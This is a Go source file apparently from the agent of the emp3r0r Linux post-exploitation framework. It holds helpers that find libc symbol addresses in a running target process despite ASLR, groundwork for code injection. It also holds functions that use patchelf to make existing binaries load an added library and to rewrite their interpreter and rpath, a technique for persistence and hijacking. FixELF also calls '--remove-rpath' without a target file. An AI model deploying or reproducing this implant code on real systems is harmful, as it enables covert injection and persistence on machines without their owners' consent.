//go:build linux
// +build linux

package agent

import (
	"bufio"
	"debug/elf"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// GetSymFromLibc: Get pointer to a libc function
// that is currently loaded in target process, ASLR-proof
func GetSymFromLibc(pid int, sym string) (addr int64, err error) {
	libc_path, base, offset, err := GetLibc(pid)
	if base == 0 || err != nil {
		err = fmt.Errorf("libc not found: %v", err)
		return
	}
	elf_file, err := elf.Open(libc_path)
	if err != nil {
		err = fmt.Errorf("ELF open: %v", err)
		return
	}
	defer elf_file.Close()
	syms, err := elf_file.Symbols()
	if err != nil {
		err = fmt.Errorf("ELF symbols: %v", err)
		return
	}
	for _, s := range syms {
		if strings.Contains(s.Name, sym) {
			addr = base + int64(s.Value) - offset
			break
		}
	}
	if addr == 0 {
		err = fmt.Errorf("scanned %d symbols, symbol (addr 0x%x) %s not found", len(syms), addr, sym)
		return
	}
	log.Printf("Address of %s is 0x%x", sym, addr)

	return
}

// GetLibc get base address, ASLR offset value, and path of libc
// by parsing /proc/pid/maps
func GetLibc(pid int) (path string, addr, offset int64, err error) {
	map_path := fmt.Sprintf("/proc/%d/maps", pid)

	f, err := os.Open(map_path)
	if err != nil {
		err = fmt.Errorf("open %s: %v", map_path, err)
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		isLibc := strings.Contains(line, "libc.so") && strings.Contains(line, " r-xp ")
		if !isLibc {
			continue
		}
		fields := strings.Fields(line)
		addr, _ = strconv.ParseInt(strings.Split(line, "-")[0], 16, 64)
		offset, _ = strconv.ParseInt(fields[2], 16, 64)

		path = fields[len(fields)-1]
		log.Printf("libc base addr is 0x%x, offset is 0x%x, path is %s",
			addr, offset, path)
		break
	}

	// check if we got the right libc
	if path == "" {
		err = fmt.Errorf("scanned map file, libc not found")
	}

	return
}

// AddNeededLib: Add a needed library to an ELF file, lib_file needs to be full path
func AddNeededLib(elf_file, lib_file string) (err error) {
	// backup
	bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, elf_file)
	if !util.IsFileExist(bak) {
		util.Copy(elf_file, bak)
	}

	// patchelf cmd
	cmd := fmt.Sprintf("%s/patchelf --add-needed %s %s",
		RuntimeConfig.UtilsPath, lib_file, elf_file)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}

// IsELF: Check if a file is ELF
func IsELF(file string) bool {
	f, err := os.Open(file)
	if err != nil {
		return false
	}
	defer f.Close()
	_, err = elf.NewFile(f)
	if err != nil {
		return false
	}
	return true
}

// FixELF: Replace ld and add rpath
func FixELF(elf_path string) (err error) {
	pwd, _ := os.Getwd()
	err = os.Chdir(RuntimeConfig.UtilsPath)
	if err != nil {
		return
	}
	defer os.Chdir(pwd)

	// paths
	rpath := fmt.Sprintf("%s/lib/", RuntimeConfig.UtilsPath)
	patchelf := fmt.Sprintf("%s/patchelf", RuntimeConfig.UtilsPath)
	ld_path := fmt.Sprintf("%s/ld-musl-x86_64.so.1", rpath)
	log.Printf("rpath: %s, patchelf: %s, ld_path: %s", rpath, patchelf, ld_path)

	// remove rpath
	cmd := fmt.Sprintf("%s --remove-rpath", patchelf)
	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf remove rpath: %v, %s", err, out)
	}

	// patchelf cmd
	cmd = fmt.Sprintf("%s --set-interpreter %s --set-rpath %s %s",
		patchelf, ld_path, rpath, elf_path)

	out, err = exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}

func IsStaticELF(file_path string) bool {
	f, err := elf.Open(file_path)
	if err != nil {
		fmt.Println("Error opening ELF file:", err)
		os.Exit(1)

	}
	defer f.Close()

	// Check if the ELF file is statically linked
	isStaticallyLinked := true
	for _, phdr := range f.Progs {
		if phdr.Type == elf.PT_DYNAMIC {
			isStaticallyLinked = false
			break
		}
	}
	return isStaticallyLinked
}
